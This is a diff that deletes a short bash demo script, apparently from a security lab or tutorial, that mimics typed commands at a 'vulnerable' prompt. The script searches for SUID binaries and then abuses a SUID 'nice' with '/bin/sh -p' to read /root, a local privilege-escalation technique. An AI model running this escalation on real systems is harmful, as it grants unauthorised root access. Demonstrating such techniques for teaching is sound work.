@@ -1,9 +1,0 @@
-#!/bin/bash
-
-echo -n "vulnerable:1> "
-echo "find / -type f -perm -04000 -ls 2>/dev/null" | pv -qL 10 
-bash -c "find / -type f -perm -04000 -ls 2>/dev/null"
-echo -n "vulnerable:1> "
-echo "nice /bin/sh -p -c \"ls -l /root\"" | pv -qL 10 
-bash -c "nice /bin/sh -p -c \"ls -l /root\""
-exit
